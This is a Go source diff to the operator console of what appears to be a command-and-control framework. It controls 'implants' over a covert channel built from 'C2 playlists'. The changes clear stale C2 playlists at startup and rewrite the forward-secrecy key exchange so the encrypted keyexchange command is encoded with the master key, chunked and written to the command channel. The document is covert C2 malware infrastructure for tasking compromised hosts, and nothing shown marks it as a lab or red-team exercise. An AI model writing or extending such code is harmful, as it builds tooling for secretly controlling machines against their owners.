@@ -277,6 +277,12 @@ func (op *Operator) Interactive() {
 	fmt.Printf("  \033[36mPolling every %ds\033[0m | Type '\033[1mhelp\033[0m' for commands\n\n",
 		int(op.pollInterval.Seconds()))
 
+	// Clean stale playlists from prior sessions
+	ctx := context.Background()
+	_ = op.client.CleanC2Playlists(ctx, protocol.ChannelCmd, op.key, -1)
+	_ = op.client.CleanC2Playlists(ctx, protocol.ChannelRes, op.key, -1)
+	fmt.Println("  [*] Cleaned stale playlists from prior sessions")
+
 	// Initial check for pending checkins
 	op.checkForCheckins()
 
@@ -781,14 +787,30 @@ func (op *Operator) negotiateForwardSecrecy(clientID, peerPubHex string) {
 
 	op.sessionKeys[clientID] = sessionKey
 
-	// Send keyexchange command with our pubkey so implant can derive the same key.
-	// Temporarily attach to this client to send the command.
-	prevAttached := op.attachedClient
-	op.attachedClient = clientID
-	op.SendCommand("keyexchange", map[string]interface{}{
-		"pubkey": hex.EncodeToString(op.ephPub.Bytes()),
-	})
-	op.attachedClient = prevAttached
+	// Send keyexchange command directly (no attach needed).
+	// Must use master key since implant hasn't derived session key yet.
+	msg := protocol.NewC2Message("keyexchange", op.nextSeq)
+	op.nextSeq++
+	msg.PubKey = hex.EncodeToString(op.ephPub.Bytes())
+
+	// Bind to this client's session
+	if info, ok := op.connectedClients[clientID]; ok {
+		msg.SessionID = info.SessionID
+	}
+
+	encoded, err := protocol.EncodeMessage(msg.ToCommandMap(), op.key)
+	if err != nil {
+		fmt.Printf("[!] Failed to send keyexchange to %s: %v\n", clientID[:8], err)
+		return
+	}
+
+	ctx := context.Background()
+	chunks, err := protocol.ChunkPayload(encoded, msg.Seq,
+		protocol.ChannelCmd, op.key)
+	if err != nil {
+		return
+	}
+	_ = op.client.WriteC2Playlists(ctx, chunks)
 
 	fmt.Printf("[*] Forward secrecy established with %s\n", clientID[:8])
 }
